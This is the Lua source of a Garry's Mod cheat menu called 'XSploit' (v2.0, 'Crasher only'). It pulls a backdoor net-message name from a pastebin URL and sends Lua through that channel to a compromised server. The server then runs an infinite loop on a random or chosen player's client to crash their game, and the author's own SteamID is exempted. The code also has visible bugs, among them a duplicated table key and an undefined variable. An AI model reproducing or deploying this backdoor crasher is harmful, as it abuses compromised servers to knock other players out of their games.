surface.CreateFont( 'title', {
	font = 'Verdana',
	extended = true,
	weight = 600,
	size = 20,
} )

surface.CreateFont( 'txt', {
	font = 'Verdana',
	extended = true,
	weight = 600,
	size = 20,
} )

surface.CreateFont( 'nicknames', {
	font = 'Verdana',
	extended = true,
	weight = 500,
	size = 16,
} )

surface.CreateFont( 'checkbox', {
	font = 'Verdana',
	extended = true,
	weight = 600,
	size = 30,
} )

local sw, sh = ScrW(), ScrH()
local mw, mh = 800, 600
local target, netkey

http.Fetch( 'https://pastebin.com/raw/4GZxeCi3', function( body ) netkey = body end)
if netkey == 'no' then
	chat.AddText( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 255, 255, 255 ), 'Разработчик запретил вам использовать backdoor' )
	chat.AddText( Color( 116, 0, 255 ), '[X', Color( 255, 255, 255 ), 'Sploit', Color( 116, 0, 255 ), '] ', Color( 255, 255, 255 ), 'Чит работать не будет!' )
end

local function ChoosePage( func )
	if func == 'MPage' then
		MPage()
	end
end

local pages = {

	[1] = {
		name = 'Main',
		func = 'MPage'
	}

}

local mfunctions = {

	[ 'pcrash' ] = {
		name = 'Реклама',
		func = 'spam'
	},

	[ 'scrash' ] = {
		name = 'Рандом краш',
		func = 'local v = table.Random( player.GetAll() ) if v:SteamID() != "' .. LocalPlayer():SteamID() .. '" and v:SteamID() != "STEAM_0:1:572284808" then v:SendLua( "while true do print() end" ) end'
	},

	[ 'pcrash' ] = {
		name = 'Крашнуть игрока',
		func = 'local v = player.GetBySteamID("' .. target .. '") if v:SteamID() != "STEAM_0:1:572284808" then v:SendLua( "while true do print() end" ) end end'
	},

}

function XSMenu()

		local xmenu = vgui.Create( 'DFrame' )
		xmenu:SetSize( mw, mh )
		xmenu:Center()
		xmenu:SetTitle( '' )
		xmenu:SetDraggable( true )
		xmenu:ShowCloseButton( false )
		xmenu:MakePopup()
		xmenu.Paint = function( self, w, h )
			draw.RoundedBox( 10, 0, 0, w, h, Color( 30, 30, 30 ) )
			draw.RoundedBox( 10, 120, 25, 5, h-65, Color( 50, 50, 50 ) )
			draw.RoundedBox( 10, 0, h-65+25, w, 5, Color( 50, 50, 50 ) )
			draw.RoundedBox( 0, 0, 25, w, 5, Color( 50, 50, 50 ) )
			draw.SimpleText( 'X', 'title', 10, 2, Color( 116, 0, 255 ) )
			draw.SimpleText( 'Sploit (HTTPS Update)', 'title', 23, 2, Color( 255, 255, 255 ) )
			draw.SimpleText( 'By X0lik', 'title', mw-90, mh-30, HSVToColor( ( CurTime() * 100 ) % 360, 1, 1 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP )
			draw.SimpleText( 'v2.0 (Crasher only)', 'title', 10, mh-30, Color( 255, 255, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP )
		end

		function CloseXMenu()
			xmenu:Remove()
		end

		local btnscroll = vgui.Create( 'DScrollPanel', xmenu )
		btnscroll:SetSize( 120, mh )
		btnscroll:SetPos( 0, 30 )

		for i = 1, #pages do

			local btn = btnscroll:Add( 'DButton' )
			btn:SetSize( 120, 45 )
			btn:Dock( TOP )
			btn:DockMargin( 0, 0, 0, 0 )
			btn:SetText( '' )
			btn.lerp = 0
			btn.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 25, 25, 25 ) )
				draw.RoundedBox( 0, 0, h-5, w, 5, Color( 50, 50, 50 ) )

				if self:IsHovered() then
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 8 )
					draw.RoundedBox( 0, 0, 0, self.lerp, h-5, Color( 116, 0, 255 ) )
				else
					self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
					draw.RoundedBox( 0, 0, 0, self.lerp, h-5, Color( 116, 0, 255 ) )
				end

				draw.SimpleText( pages[i].name, 'txt', 60, 20, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end

			btn.DoClick = function()
				ChoosePage( pages[i].func )
			end

		end

		local closebtn = vgui.Create( 'DButton', xmenu )
		closebtn:SetSize( 25, 25 )
		closebtn:SetPos( mw-25, 0 )
		closebtn:SetText( '' )
		closebtn.lerp = 0
		closebtn.Paint = function( self, w, h )
			if self:IsHovered() then
				self.lerp = Lerp( FrameTime() * 6, self.lerp, w )
				draw.RoundedBoxEx( 10, 0, 0, self.lerp, h, Color( 220, 20, 60 ), false, true, false, false )
			else
				self.lerp = Lerp( FrameTime() * 6, self.lerp, 0 )
				draw.RoundedBoxEx( 10, 0, 0, self.lerp, h, Color( 220, 20, 60 ), false, true, false, false )
			end

			draw.SimpleText( 'X', 'title', 12, 12, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		end

		closebtn.DoClick = function()
			surface.PlaySound("garrysmod/ui_click.wav")
			xmenu:Close()
		end

		function MPage()

			if lastpanel != 'nil' then
				lastpanel:Remove()
			end

			local mpanel = vgui.Create( 'DScrollPanel', xmenu )
			mpanel:SetSize( 250, mh-100 )
			mpanel:SetPos( 150, 45 )
			mpanel.Paint = function( self, w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 30, 30, 30 ) )
			end

			lastpanel = mpanel

			for i,v in pairs( mfunctions ) do

				local mbtn = mpanel:Add( 'DButton' )
				mbtn:SetSize( 250, 35 )
				mbtn:SetText( '' )
				mbtn:Dock( TOP )
				mbtn:DockMargin( 0, 0, 0, 0 )
				mbtn.lerp = 0
				mbtn.Paint = function( self, w, h )
					draw.RoundedBox( 0, 0, 0, w, h, Color( 40, 40, 40 ) )
					draw.RoundedBox( 0, 0, h-5, w, 5, Color( 100, 100, 100 ) )

					if self:IsHovered() then
						self.lerp = Lerp( FrameTime() * 9, self.lerp, w+1 )
						draw.RoundedBox( 0, 0, h-5, self.lerp, 5, Color( 116, 0, 255 ) )
					else
						self.lerp = Lerp( FrameTime() * 9, self.lerp, 0 )
						draw.RoundedBoxEx( 0, 0, h-5, self.lerp, 5, Color( 116, 0, 255 ) )
					end

					draw.SimpleText( mfunctions[i].name, 'txt', w/2, h/2, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end

				mbtn.DoClick = function()
					net.Start( netkey )
					net.WriteString( mfunctions[i].func )
					net.SendToServer()
				end

			end

		end

end

hook.Add( 'CreateMove', 'ToggleMenu', function()

    if input.WasKeyPressed( KEY_INSERT ) then

    	t = t + 1
        if t == 1 then
		    if isclosed then
		    	XSMenu()
		    	isclosed = false
		    else
		    	CloseXMenu()
		    	isclosed = true
		    end
		else
			t = 0
		end

    end

end)

concommand.Add( 'xsploit_beta', XSMenu)
